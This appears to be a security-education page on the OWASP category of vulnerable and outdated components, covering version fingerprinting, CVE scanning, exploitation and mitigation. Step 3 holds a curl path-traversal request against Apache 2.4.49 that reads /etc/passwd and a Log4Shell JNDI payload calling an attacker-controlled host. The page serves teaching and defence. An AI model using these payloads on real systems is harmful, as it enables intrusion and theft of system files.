# Vulnerable and Outdated Components (A06:2021)

Modern apps are mostly other people's code - frameworks, libraries, plugins, container base images, OS packages. When any of those has a known vulnerability (a published CVE) and you haven't patched it, attackers have a ready-made exploit. This is one of the easiest categories to exploit because the research is already done - just match a version to a public PoC.

Famous examples: **Log4Shell** (Log4j), **Struts** (Equifax breach), **Heartbleed** (OpenSSL), **Spring4Shell**.

## Step 1 - Fingerprint versions

```bash
# Web tech + versions
whatweb https://target.tld
wappalyzer / builtwith (browser)

# Headers, error pages, and JS bundles often leak versions
curl -sI https://target.tld           # Server:, X-Powered-By:
# e.g. jquery-3.1.0.min.js, /wp-includes/ (WordPress), Apache/2.4.49
```

## Step 2 - Map versions to known CVEs

```bash
# Templated CVE scanning
nuclei -u https://target.tld -t http/cves/

# CMS-specific
wpscan --url https://target.tld --enumerate vp   # WordPress plugins/themes
droopescan scan drupal -u https://target.tld

# Network services
nmap -sV --script vulners target.tld

# Search for exploits
searchsploit apache 2.4.49
```

## Step 3 - Exploit (in scope)

Example - Apache 2.4.49 path traversal / RCE (CVE-2021-41773):

```bash
curl "https://target.tld/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" --path-as-is
```

Log4Shell (CVE-2021-44228) - inject a JNDI lookup into any logged field:

```text
${jndi:ldap://attacker.oastify.com/a}     # in User-Agent, username, etc.
```

## Dependency scanning (defender / DevSecOps side)

```bash
npm audit                     # Node.js
pip-audit                     # Python
osv-scanner -r .              # multi-ecosystem
trivy image myapp:latest      # container image CVEs
grype dir:.                   # SBOM/dep scanning
```

## Tools

- [nuclei](https://github.com/projectdiscovery/nuclei), [nmap vulners](https://github.com/vulnersCom/nmap-vulners)
- [searchsploit / Exploit-DB](https://www.exploit-db.com/), [WPScan](https://wpscan.com/)
- [Trivy](https://github.com/aquasecurity/trivy), [Grype](https://github.com/anchore/grype), [OSV-Scanner](https://github.com/google/osv-scanner)

## Mitigation - the fix

- Maintain an **inventory / SBOM** of all components and versions.
- **Patch promptly**; subscribe to CVE feeds and vendor advisories.
- Remove unused dependencies and features (smaller attack surface).
- Automate **dependency + container scanning** in CI, and fail builds on criticals.
- Prefer maintained libraries; pin and verify versions.

## Practice

- VulHub (reproducible vulnerable component labs), TryHackMe rooms

## Reference

- [OWASP A06:2021](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
